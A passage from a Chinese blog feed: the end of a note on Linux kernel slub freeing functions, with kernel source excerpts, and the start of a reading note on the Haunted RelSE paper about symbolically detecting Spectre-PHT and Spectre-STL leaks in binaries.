class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">free_large_kmalloc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> folio *folio, <span class="hljs-type">void</span> *object)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order = folio_order(folio);<br><br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(order == <span class="hljs-number">0</span>))<br>pr_warn_once(<span class="hljs-string">&quot;object pointer: 0x%p\n&quot;</span>, object);<br><br>kmemleak_free(object);<br>kasan_kfree_large(object);<br>kmsan_kfree_large(object);<br><br>mod_lruvec_page_state(folio_page(folio, <span class="hljs-number">0</span>), NR_SLAB_UNRECLAIMABLE_B,<br>      -(PAGE_SIZE &lt;&lt; order));<br>__free_pages(folio_page(folio, <span class="hljs-number">0</span>), order);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="III-kmem-cache-free-：常规的释放函数"><a href="#III-kmem-cache-free-：常规的释放函数" class="headerlink" title="III. __kmem_cache_free()：常规的释放函数"></a>III. __kmem_cache_free()：常规的释放函数</h3><p><code>__kmem_cache_free()</code> 主要就是对 <code>slab_free()</code> 的 wrapper，不过会指定 tail 为 NULL：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __kmem_cache_free(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *x, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> caller)<br>&#123;<br>slab_free(s, virt_to_slab(x), x, <span class="hljs-literal">NULL</span>, &amp;x, <span class="hljs-number">1</span>, caller);<br>&#125;<br></code></pre></td></tr></table></figure><p>而 <code>slab_free()</code> 则会最终调用到 <code>do_slab_free()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __fastpath_inline <span class="hljs-type">void</span> <span class="hljs-title function_">slab_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab,</span><br><span class="hljs-params">      <span class="hljs-type">void</span> *head, <span class="hljs-type">void</span> *tail, <span class="hljs-type">void</span> **p, <span class="hljs-type">int</span> cnt,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)</span><br>&#123;<br>memcg_slab_free_hook(s, slab, p, cnt);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * With KASAN enabled slab_free_freelist_hook modifies the freelist</span><br><span class="hljs-comment"> * to remove objects, whose reuse must be delayed.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (slab_free_freelist_hook(s, &amp;head, &amp;tail, &amp;cnt))<br>do_slab_free(s, slab, head, tail, cnt, addr);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里用到了一个函数 <code>slab_free_freelist_hook()</code>，主要的作用是遍历待释放的 freelist：</p><ul><li>如果设置了 free hook（ <code>slab_free_hook() == true</code> ），则仅减少计数以推迟释放</li><li>否则重新建立一遍 freelist 后返回</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">slab_free_freelist_hook</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s,</span><br><span class="hljs-params">   <span class="hljs-type">void</span> **head, <span class="hljs-type">void</span> **tail,</span><br><span class="hljs-params">   <span class="hljs-type">int</span> *cnt)</span><br>&#123;<br><br><span class="hljs-type">void</span> *object;<br><span class="hljs-type">void</span> *next = *head;<br><span class="hljs-type">void</span> *old_tail = *tail ? *tail : *head;<br><br><span class="hljs-keyword">if</span> (is_kfence_address(next)) &#123;<br>slab_free_hook(s, next, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">/* Head and tail of the reconstructed freelist */</span><br>*head = <span class="hljs-literal">NULL</span>;<br>*tail = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">do</span> &#123;<br>object = next;<br>next = get_freepointer(s, object);<br><br><span class="hljs-comment">/* If object&#x27;s reuse doesn&#x27;t have to be delayed */</span><br><span class="hljs-keyword">if</span> (!slab_free_hook(s, object, slab_want_init_on_free(s))) &#123;<br><span class="hljs-comment">/* Move object to the new freelist */</span><br>set_freepointer(s, object, *head);<br>*head = object;<br><span class="hljs-keyword">if</span> (!*tail)<br>*tail = object;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Adjust the reconstructed freelist depth</span><br><span class="hljs-comment"> * accordingly if object&#x27;s reuse is delayed.</span><br><span class="hljs-comment"> */</span><br>--(*cnt);<br>&#125;<br>&#125; <span class="hljs-keyword">while</span> (object != old_tail);<br><br><span class="hljs-keyword">if</span> (*head == *tail)<br>*tail = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> *head != <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="三、上层调用接口关系图-1"><a href="#三、上层调用接口关系图-1" class="headerlink" title="三、上层调用接口关系图"></a>三、上层调用接口关系图</h2><p>涉及到内存释放的函数相较于内存分配其实少很多，常用的主要就是 <code>kfree()</code>、<code>kfree_sensitive()</code>、<code>kmem_cache_free()</code> 这三大函数：</p><p><img src="https://s2.loli.net/2023/02/24/Itbqo2eO15yn7ZW.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;别人问你哪里丑态你再把他反手挂到自己的小 slub 里寻求认同&lt;/p&gt;</summary>
    
    
    
    <category term="OS" scheme="http://blog.arttnba3.cn/categories/OS/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="学习札记" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="内存管理" scheme="http://blog.arttnba3.cn/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
    <category term="slub allocator" scheme="http://blog.arttnba3.cn/tags/slub-allocator/"/>
    
  </entry>
  
  <entry>
    <title>【PAPER.0x01】论文笔记：Hunting the Haunter — Efficient Relational Symbolic Execution for Spectre with Haunted RelSE </title>
    <link href="http://blog.arttnba3.cn/2023/01/29/PAPER-0X01-HUNTING_THE_HAUNTER-EFFICIENT_RELATIONAL_SYMBOLIC_EXECUTION_FOR_SPECTRE_WITH_HAUNTED_RELSE/"/>
    <id>http://blog.arttnba3.cn/2023/01/29/PAPER-0X01-HUNTING_THE_HAUNTER-EFFICIENT_RELATIONAL_SYMBOLIC_EXECUTION_FOR_SPECTRE_WITH_HAUNTED_RELSE/</id>
    <published>2023-01-28T18:37:51.000Z</published>
    <updated>2023-04-23T16:40:42.749Z</updated>
    
    <content type="html"><![CDATA[<p>鬼！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>本校在毕设之前还有个“小毕设”——<code>网络空间安全综合实验</code> ，刚好笔者要做的题目是基于这篇论文完成的，所以还是简单写一个阅读笔记：）</p><blockquote><p>说是笔记，其实还是差不多相当于把原文翻译了一遍（（（</p></blockquote><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p><strong>Spectre</strong> 是一种微架构层面的漏洞，其允许攻击者利用推测执行（speculation executino）技术中的漏洞来泄露信息，但对于该类型漏洞的检测面临着两个挑战：①推测路径带来的搜索空间爆炸②在不同编译阶段引入的 Spectre 漏洞</p><p>本文提出了在二进制级的 Spectre 漏洞的量化检测的优化方法：<code>Haunted RelSE</code>，并证明了相比于在最先进的工具中的更朴素的显式推测执行方法（more naive explicit speculative execution approach），该优化是语义正确的</p><p>研究者在一个符号分析工具中应用了 <code>Haunted RelSE</code> ，并在一个有名的 Spectre-PHT（Spectre v1） 的 litmus tester 上进行了测试，并打算在一个新的 Spectre-STL（Spectre v4）的 litmus tester 上测试</p><blockquote><p>litmus test：对内存一致性的测试</p><blockquote><p>好像没有啥中文翻译，相关的中文资料也少，摸了</p></blockquote></blockquote><p>该技术比最先进的工具发现了更多的 violations 与 scales，并让研究者发现：对 Spectre-PHT 的标准防护手段 <code>index-masking</code> 与著名的编译  <em>位置无关的可执行文件</em>  （position independent executables）的 gcc 选项，导致了 Spectre-STL 的引入</p><p>研究者提出并验证了一种对 <code>index-masking</code> 的修正方法</p><h1 id="0x01-INTRODUCTION"><a href="#0x01-INTRODUCTION" class="headerlink" title="0x01. INTRODUCTION"></a>0x01. INTRODUCTION</h1><p>现代 CPU 的执行速度依赖于包括分支预测器（branch predictor）与 <em>投机</em> （ <em>speculation</em> ）在内的复杂硬件逻辑：提前执行指令 &amp; 尝试通过分支预测器来推测执行（speculatively execute）一条控制流，若推测失败则恢复被影响区域——称为  <em>恢复执行</em> （Reverted execution，也叫做 <em>瞬态执行</em> （transient execution），意为从架构角度来看这个操作是透明的）</p><p>但瞬态执行会在微架构级（microarchitecture）留下可观测的侧面影响（side effects），而这可以被攻击者用以恢复架构级（architectural）的秘密——这种攻击手法称之为<strong>幽灵攻击</strong>（Spectre attacks）</p><p>幽灵有着<a href="https://transient.fail/">多种变种</a>，但绝大部分的工作都仅关注于  <code>Spectre-v1</code> （Pattern History Table，对条件分支的攻击），仅有 <a href="https://arxiv.org/pdf/1910.01755.pdf">Pitchfork</a> 做了 <code>Spectre-v4</code> （Store to Load，对内存屏障预测器的攻击）的相关工作，但并不完善</p><h4 id="Goal-and-Challenge"><a href="#Goal-and-Challenge" class="headerlink" title="Goal and Challenge"></a>Goal and Challenge</h4><p>本篇论文中研究者提出了一种用以检测 <code>Spectre-PHT</code> 与 <code>Spectre-STL</code> 漏洞的方法，并应用于静态二进制代码分析中，这面临着两个挑战：</p><ul><li><strong>C1</strong>：微架构的细节在分析中无法被完全获得，需要一种足够强大的提取方法以提取造成侧信道攻击的微架构状态（mocroarchitectural state）</li><li><strong>C2</strong>：对可能的推测执行的探索的规模不能太大，否则会造成状态爆炸（state explosion）</li></ul><h4 id="Proposal"><a href="#Proposal" class="headerlink" title="Proposal"></a>Proposal</h4><p>本文通过在文献中创造的  <em>关系安全属性</em>  （relational security property）作为  <em>推测常数时间</em>  （speculative constant-time）来应对挑战 C1。推测常数时间在没有详细建模复杂的微架构细节的情况下将推测执行纳入考虑，但编译器没必要保护常数时间编程（constant-time programming），故我们的分析在二进制层操作（无需源码）。本文将前人的模型扩展到常数时间二进制分析上，以分析  <em>推测常数时间</em>  </p><p><strong>符号执行</strong>（symbolic execution）是一项在二进制代码上扩展良好的技术，但为了分析推测常数时间，其必须考虑程序的推测行为。Spectre-PHT 与 Spectre-STL 的符号分析者通过 fork 以探索临时路径，从而对推测性行为进行 <em>清晰地</em>  （explicitly）建模，而这导致了状态爆炸——尤其是对 Spectre-STL 而言。对符号执行的常数时间样式（constant-time-like）的属性的改造，称为  <em>关系符号执行</em>  （relational symbolic execution， RelSE），在二进制层面的可伸缩性与精度上已被证明是非常成功的</p><p>为了解决 C2，本文的核心技术是利用 RelSE 来  <em>在同一时间</em> 像常规执行（即，与正确的推测相关的执行） 那样执行临时的执行；本文将这种技术命名为 <code>Haunted RelSE</code>：</p><ul><li>对于 Spectre-PHT，其通过同时执行由条件语句产生的瞬态的与常规的路径以对多余状态进行剪枝</li><li>对于 Spectre-STL，其对多余状态进行剪枝并将剩余部分编码在一个单独的符号路径中，而非为每个可能的加载与存储交叉将符号执行进行分支</li></ul><p>本文在一个二进制层的关系符号分析工具 BINSEC&#x2F;HAUNTED 中应用 Haunted RelSE，为了进行评估，本文使用了 Spectre-PHT 的著名测试用例 Kocher ，以及一组为 Spectre-STL 提出的新测试用例，以及来自 donna、Libsodium 与 OpenSSL 库的真实世界密码学代码</p><p><strong>Findings.</strong> 本文的工作展示了一种用于对抗 Spectre-PHT 的著名防御手段 index-masking 可能会引入新的 Spectre-STL 漏洞，并提出且验证了用以解决这个问题的安全实现，通过本文的工具还发现了 GCC 中一个流行的用以生成位置无关代码（position-independent code）的选项可能引入 Spectre-STL 漏洞，同时还确认了由编译器添加的栈保护在密码原语（cryptographic primitives）中引入了 Spectre violations</p><p><strong>Contributions.</strong> 总结起来本文的工作就是：</p><ul><li>研究者设计了一种基于关系符号执行的技术，称之为 <code>Haunted Relse</code>，用以在符号分析中高效地分析推测执行，以检测 PHT 与 STL Spectre（Section III &amp; IV）；<code>Haunted Relse</code> 的基本思想是同时基于常规的与瞬态的行为进行符号化推断，尽管研究者对内存的编码让人联想到一些状态合并的编码，但实际上其遵循了不同的理论，通过防止常规与瞬态执行之间的人工阻断，而非试图将不同的路径（可能不相关）打包在一起；研究者正式证明了显式地对所有的推测路径建模进行关系分析与使用 Haunted Relse 在语义上等价（Section IV）</li><li>研究者提出了一种名为 <code>BINSEC/HAUNTED</code> 的验证工具，实现了 <code>Haunted Relse</code>，并通过著名的用于 spectre-PHT 的 litmus test 进行评估；研究者还进一步地提出一组用于 Spectre-STL 的 litmus test 且用其测试了 <code>BINSEC/HAUNTED</code>；试验的评估显示了 <code>BINSEC/HAUNTED</code> 可以在如 OpenSSL、donna、Libsodium 这样的真实世界的密码学代码中发现推测常数时间漏洞；对于 Spectre-PHT，<code>BINSEC/HAUNTED</code> 最多可以分析 5k 条静态指令，并比现有水平的  KLEESpectre 与 Pitchfork 更快（但精准度更低）；对于 Spectre-STL，其可以最多分析 100 条指令并在高达 6k 条指令的代码中找到漏洞；相比于 Pitchfork，<code>BINSEC/HAUNTED</code> 明显更快，且能找到更多的漏洞并报告更多的不安全程序</li><li>据研究者所知，其第一个报告了著名的用于对抗 Spectre-PHT 的防护 <code>index-masking</code> 有可能引入 Spectre-STL 漏洞；研究者提出了用以修复这个问题的正确实现（Section VI），并用其工具进行了验证；研究者同时还第一个报告了 GCC 编译器的 PIC 选项引入了 Spectre-STL 漏洞（Section VI）</li></ul><p><strong>Discussion.</strong> 当 Spectre attacks 开启了系统安全的新战场，对推测执行的思考变得困难且冗长，这需要自动搜索技术，但由于额外的推测行为引起的路径爆炸，此前的提案都存在可扩展性问题，<code>Haunted RelSE</code> 是向着可扩展的对 Spectre attacks 的分析迈出的一步；对于 Spectre-PHT，Haunted RelSE 可以在一些情况下提高分析速度，对分析推测语义的复杂性进行剪枝，并缩放于中等大小的真实世界中的密码学二进制文件；对于 Spectre-STL，其为第一个可以彻底分析小的真实世界密码学二进制文件的工具，并能在中等大小的真实世界密码学二进制文件中找到漏洞</p><h1 id="0x02-BACKGROUND"><a href="#0x02-BACKGROUND" class="headerlink" title="0x02. BACKGROUND"></a>0x02. BACKGROUND</h1><p>本节研究者提供了关于 Spectre 的基本背景：推测常数时间（speculative constant-time）与关系符号执行（relational symbolic execution）</p><p><strong>Spectre attacks.</strong> 在现代处理器中，只要指令的操作数可用，其被按顺序获取并存放在一个 <em>重排序缓冲区</em> （reorder buffer）中，且能按任意顺序执行；处理器同时使用<strong>推测</strong>（speculation）机制以在特定指令执行之前预测其输出，由误判带来的指令流——即 <em>瞬态执行</em> （transient execution）会被在架构级还原（例如恢复寄存器的值），但这可能遗留微架构级的侧面影响（例如 cache 的状态可能不会被恢复），而这些微架构级的侧面影响对程序是透明的，这使得攻击者可以进行侧信道攻击，<strong>幽灵攻击</strong>（Spectre attacks） 便是利用这种推测机制来触发这样的会在微架构级存储秘密数据的瞬态执行——称之为 <code>spectre gadgets</code>，这将被通过侧信道攻击进行复原</p><p>幽灵攻击一共有四种根据针对的机制的不同变种：</p><ul><li><code>Spectre-PHT</code>：对用以预测条件分支的 <code>Pattern History Table</code> 进行利用</li><li><code>Spectre-BHB</code>：对用以预测分支地址的 <code>Branch Target Buffer </code>进行利用</li><li><code>Spectre-RSB</code>：对用以预测返回地址的 <code>Return Stack Buffer </code>进行利用</li><li><code>Spectre-STL</code>：对用以预测 <code>Store-To-Load dependencies</code> 的消歧义机制进行利用</li></ul><p>对 BTB 与 RSB 变种的推测机制，可能会被误认为任意地址跳转，这对静态分析而言比较棘手（参见 Section VII），故研究者主要关注 Spectre-PHT 与 Spectre-STL</p><p><strong>Spectre-PHT.</strong> <code>Pattern History Table</code> 用以在微架构级预测条件分支的输出；我们首先介绍 Spectre 的变种 1，攻击者滥用分支预测器以故意在一个分支进行错误的推测；即使程序中的条件语句在架构级确保了内存访问的范围固定，攻击者可以引导 PHT 错误预测一个分支的值以瞬态执行一个越界内存访问，这在缓存中留下可以被观测到的且能被用以恢复越界读的数据的影响（Listing 1）</p><p><img src="https://s2.loli.net/2023/01/25/WZD6Vx1YTv3koiG.png" alt="Listing 1: Illustration of a Spectre-PHT attack."></p><p><strong>Spectre-STL.</strong> <code>Store-To-Load dependencies</code> 需要在所有的 store 指令完成执行前 load 指令不会执行，为了让 CPU 瞬态执行 store 指令并避免缓存未命中导致的暂停，store 指令以队列形式存放在一个 <code>store buffer</code> 中，而相较于等待先前的 store 指令完成，load 指令可以直接从匹配的带有 <em>store-to-load forwarding</em> 的 <code>store buffer </code> 中取值；此外，当内存消歧义器（memory disambiguator）预测到一个 load指令并非等待中的 store 的别名，其可以 <em>推测性地绕过在 store buffer 中等待中的 store</em> 并直接从主存取值；Spectre-STL 利用这种行为来载入会被编码于缓存中的包含秘密数据的旧值（Listing 2）</p><p><img src="https://s2.loli.net/2023/01/25/r7wLWqOlckJHzbK.png" alt="Listing 2: Illustration of a Spectre-STL attack."></p><p><strong>Speculative constant-time</strong>（SCT）. 常数时间（constant time）是密码学代码中一个流行的编程规范：程序不会存储、装载秘密数据值或是以其进行分支，以避免侧信道数据泄露；然而常数时间并不足以预防幽灵攻击，如 Listing 1 为一个常规的没有对秘密数据的访问或以其分支的常数时间程序，但该程序存在 Spectre-PHT 漏洞，攻击者可以误导式训练分支预测器并在瞬态执行中泄露秘密数据；推测常数时间是最近的一个扩展常数时间以考虑瞬态执行的安全属性</p><p><strong>Definition 1</strong>（Speculative constant-time）. 当且仅当一个程序的每一对（推测）执行有着相同的公共输入并协定了推测决策、且互相的控制流与内存访问都相等时，该程序关于推测常数时间是安全的。</p><p>需要注意的是 SCT（类似于常数时间与其他信息流属性）并非一个执行轨迹的属性，而与两个执行轨迹相关联，因此需要近似工具以高效地建模轨迹对</p><p><strong>Binary-level symbolic execution.</strong> 符号执行（Symbolic Execution）即使用符号输入执行程序，其会构建一个称为 <em>路径谓语</em> （path predicate）的逻辑表达式，用以保存在执行过程中遇到的分支条件；为了确认一条路径是否能通，路径谓语会被交给可满足性模理论求解器（SMT solver）进行求解；符号执行同时还能检查断言以寻找漏洞或是进行有界验证（即，在一个确定的深度下进行验证）</p><p>分析二进制代码通常采用将代码指令解码为一种低级的中间语言的形式，在二进制级的符号执行中的值（如寄存器、内存地址、内存内容等）为固定大小的符号位向量，内存被表示为一个用 32 位的位向量表示地址的符号字节数组，一个符号数组为一个通过如下操作将每个下标 <code>i ∈ I</code> 映射到对应值 <code>v ∈ V</code> 的函数（<code>Array I V</code>）：</p><ul><li><code>select</code>：<code>(Array I V) × I → V</code> 获取一个数组 <code>a</code> 与一个下标 <code>i</code>，返回一个存储在数组 <code>a</code> 的下标 <code>i</code> 的值 <code>v</code></li><li><code>store</code>：<code>(Array I V) × I × V → (Array I V)</code>  获取一个数组 <code>a</code> 、一个下标 <code>i</code> 与一个值 <code>v</code>，返回将下标 <code>i</code> 映射到值 <code>v</code> 的数组 <code>a</code></li></ul><p><strong>Relational Symbolic Execution.</strong> <code>关系符号执行</code>（RelSE）是一种有前景的将符号执行进行扩展以分析如 SCT 这样的两个执行路径的安全属性的方法，其符号化地在相同的符号执行实例中执行一个程序的两个版本并在其之间最大化共有部分；以分析常数时间为例，RelSE 让两个程序 <em>共享相同的公有输入</em> （public input），但使用不同的 <em>秘密输入</em>  （secret input），并在执行过程中检查是否条件分支的输出与内存下标在两个执行中必须一致——这代表其是否决定于秘密</p><p>在 RelSE 中，变量被映射到 <em>关系表达式</em> （relational expression）中，当其可能依赖于秘密数据时，其为一对符号表达式（表示为 <code>&lt;ϕl | ϕr&gt;</code> ），否则为一个简单的符号表达式（表示为 <code>&lt;ϕ&gt;</code> ）；为了对内存访问与条件指令进行安全评估，研究者使用如下定义的函数 <code>secLeak</code> 以确保一个关系表达式并不决定于秘密（即，表达式左右内容必须相等）：</p><p><img src="https://s2.loli.net/2023/01/27/mAty1adqCrk49UV.png" alt="image.png"></p><p><code>|=</code> 表示可满足（反之表示不满足），其依赖于这样一个事实：若 $\widehat{\varphi}$ 为一个简单的表达式，参照定义，其并不依赖于秘密，因而可以被安全地泄露；然而若 $\widehat{\varphi}$  为一对表达式  <code>&lt;ϕl | ϕr&gt;</code> ，仅当 <code>ϕl</code> 与 <code>ϕr</code> 在当前路径谓语 <code>π</code> 下不可被确认时（即表达式 <code>π ∧ ϕl ≠ ϕr</code> 不可被满足），泄露才是安全的</p><p><strong>Notations.</strong> 大小为 <code>n</code> 的符号位向量的集合表示为 <em>Bv<sub>n</sub></em> ，符号表达式（位向量或数组）  <em>ϕ, ϕl , ϕr, ψ, . . .</em>  的集合表示为 <code>Φ</code> ，关系表达式 $\widehat{\varphi}$，$\widehat{\psi}$, . . . 的集合表示为 <strong>Φ</strong> ， $\widehat{\varphi}$ 左、右的值表示为  $\widehat{\varphi _{|l}}$ 、$\widehat{\varphi _{|r}}$ ，若$\widehat{\varphi} &#x3D; \langle \varphi \rangle$ ，则  $\widehat{\varphi _{|l}}$ 、$\widehat{\varphi _{|r}}$ 都被定义为  $\widehat{\varphi}$ ，符号数组上的函数 <code>select</code> 与 <code>store</code> 的关系表达式为：</p><p><img src="https://s2.loli.net/2023/01/27/HVZc2jtCybDEUQh.png" alt="image.png"></p><h1 id="0x03-HAUNTED-RELSE"><a href="#0x03-HAUNTED-RELSE" class="headerlink" title="0x03. HAUNTED RELSE"></a>0x03. HAUNTED RELSE</h1><p>为了分析 SCT，我们需要修改 RelSE 以考虑程序的推测语义（speculative semantics），这包括 <em>常规表达式</em> ——被作为一个好的推测结果而执行的且会在推测被解决时保存的指令——以及所有可能的 <em>瞬态执行</em> ——被作为误测且会在推测解决时被丢弃的指令；本节描述解决这个问题的方法——在最新的工具中使用（参见 Table V）——研究者称之为 <em>Explicit</em> ，因为其直接建模了瞬态执行，并展现了研究者的优化探索策略，称之为 <em>Haunted</em></p><h3 id="A-Spectre-PHT"><a href="#A-Spectre-PHT" class="headerlink" title="A. Spectre-PHT"></a>A. Spectre-PHT</h3><p><em>1）Explicit RelSE for Spectre-PHT</em> ： <em>Explicit</em> 尝试通过符号执行建模 Spectre-PHT——于 KLEESpectre 中引入——通过将每个条件分支分成四个路径来直接地建模了瞬态执行；例如 <code>Fig.1a</code> 中的程序与 <code>Fig.1b</code> 中的该程序的符号执行树，在条件指令 <strong>if</strong> <code>c1</code> 后，执行将分成四个路径：</p><ul><li>两个 <em>常规路径</em> （regular path）：如同标准符号执行一般，第一个路径跟着 <code>then</code> 分支并将约束 <code>(c1 == true)</code> 添加到路径谓语中，第二条路径跟着 <code>else</code> 分支并将约束 <code>(c1 == false)</code> 添加到路径谓语中</li><li>两个 <em>瞬态路径</em> （transient path）：为了统计被误判到 <code>true</code> 的瞬态执行，<code>then</code> 分支被以约束 <code>(c1 == false)</code> 执行，为了统计被误判到 <code>false</code> 的瞬态执行，<code>else</code> 分支被以约束 <code>(c1 == true)</code> 执行；这些瞬态路径会在达到 <em>推测边界</em> （speculation bound，通常由重排序缓冲区的大小决定）后被丢弃</li></ul><p>为了验证 SCT，我们需要确认内存访问与条件状态是否在常规路径与瞬态路径上都没有泄露秘密信息；在常规路径上我们要确认程序的 <em>控制流</em> 与 <em>load 和 store 指令的下标</em> 并不决定于秘密输入，然而在瞬态路径上我们仅确认  <em>控制流</em> 与 <em>load 和 store 指令的下标</em>  ，因为在推测执行中，内存的 store 操作为 store buffer 中的队列，直到过期之前对缓存都不可见</p><p><em>Problem with Explicit</em> ：对于 <code>Fig. 1b</code>，我们看到两条子树都为常规执行与瞬态执行 <code>then</code> 分支的结果（即 子树起始于状态 <code>A</code> ），对应于不同路径谓语下的相同指令，准确地说，若我们将 $\widehat{\psi _{cf} }$ 、$\widehat{\psi _{ld} }$ 、$\widehat{\psi <em>{st}}$ 称为子树 <code>A</code> 中对应的 <em>控制流状态、 load 下标、store 下标</em> 的关系表达式，则对于常规执行我们需要检查 $seckeak(\pi \and c</em>{1},\widehat{\psi <em>{cf}}) \and seckeak(\pi \and c</em>{1},\widehat{\psi <em>{ld}}) \and seckeak(\pi \and c</em>{1},\widehat{\psi <em>{st}})$  ，对于瞬态执行我们需要检查 $seckeak(\pi \and \neg c</em>{1},\widehat{\psi <em>{cf}}) \and seckeak(\pi \and \neg c</em>{1},\widehat{\psi _{ld}})$；最终等价于检查如下表达式：</p><p>$$<br>seckeak(\pi,\widehat{\psi _{cf}}) \and seckeak(\pi,\widehat{\psi <em>{ld}}) \and seckeak(\pi \and c</em>{1},\widehat{\psi _{st}})<br>$$</p><p>该表达式基本近似于在没有约束 <code>c1</code> 的情况下符号化地执行 <code>then</code> 分支至 $\delta$，检查 load 的下标 $\widehat{\psi _{ld} }$ 与控制流表达式 $\widehat{\psi _{cf} }$，仅将 <code>c1</code> 添加到 store 下标 $\widehat{\psi _{st} }$ 的检查中</p><p><em>这样的发现让研究者设计出来 Explicit RelSE 的优化方法：探索一个单独的同时包含程序的常规与瞬态行为的推测路径，以在保存一个等价结果的同时对状态进行剪枝</em></p><p><em>2）Haunted RelSE for Spectre-PHT</em>  ：相较于将执行分为四个路径，Haunted RelSE 仅将其分为两个路径，如 <code>Fig. 1c</code> 所示，在条件分支 <strong>if</strong> <code>c1</code> 之后，执行将分为两个路径：一个路径跟随 <code>then</code> 分支（子树 <code>A</code>），另一路径跟随 <code>else</code> 分支（子树 <code>B</code>），两个分支都同时对常规与相应的瞬态路径的行为进行建模；此外，其会延迟（可能免去）对路径约束的检查——仅会添加约束 $c _{1} \or \neg c _{1}$ ；最终，约束将会在条件分支失效后（在  $\delta$ 步后）被添加到路径谓语中</p><p>在每个条件状态 （或是 load 指令），研究者会检查条件（或是 load 下标）在常规执行与瞬态执行中都不依赖于秘密（即，使用路径谓语 π）：$seckeak(\pi,\widehat{\psi _{cf}}) \and seckeak(\pi,\widehat{\psi _{ld}})$ ；另一方面，store 指令仅会在常规执行下被检查（即，使用路径谓语 $\pi \and c _{1}$）；最终，条件 $(c1 &#x3D;&#x3D; true)$ 会被在  $\delta$ 步后被添加到路径谓语中</p><p><img src="https://s2.loli.net/2023/01/27/ba8tRJLwo6IzSnq.png" alt="Figure 1: Comparison of RelSE of program in Fig. 1a, where solid paths represent regular executions, dotted paths represent transient executions, and δ is the speculation depth."></p><h3 id="B-Spectre-STL"><a href="#B-Spectre-STL" class="headerlink" title="B.Spectre-STL"></a>B.Spectre-STL</h3><p><em>1) Explicit RelSE for Spectre-STL</em> ：在微架构级别，一个 load 指令可以从 store buffer 的任意匹配的 entry 或是从主存获取其值，这意味着 load 可以绕过 store buffer 中未决的 store 操作直到达到主存；为了统计这一行为， <em>Explicit</em> 策略——应用于 PITCHFORK 中——通过为每个可能的 load 与 store 交错进行符号执行分支以直接建模瞬态执行</p><p>考虑 <code>Fig.2a</code> 中的程序，对于 store 指令的符号执行给出 <code>Fig. 2b </code> 中定义的符号化内存 $\mu _{3}$，其为从 <code>initial_memory</code> 开始的一系列符号化 store 操作；有了这样按时间顺序的表示，我们可以很容易地用符号化内存中的最后 <code>|SB|</code> 次 store 操作来定义一个大小为 <code>|SB|</code> 的 store buffer；类似的，主存也可以通过移除符号化内存中的最后 <code>|SB|</code> 次 store 操作进行定义；以一个大小为 2 的 store buffer 为例，当主存由 $\mu _{1}$ 定义时，最后两次 store 构成了 store buffer</p><p>第一条 load 指令（block <code>A</code>）可以绕过 store buffer 中的每一个 store 操作直到其达到主存，因此 <code>x</code> 有三种可能的值，如 <code>Fig. 2c</code> 所示：</p><ul><li>常规值 $r$ 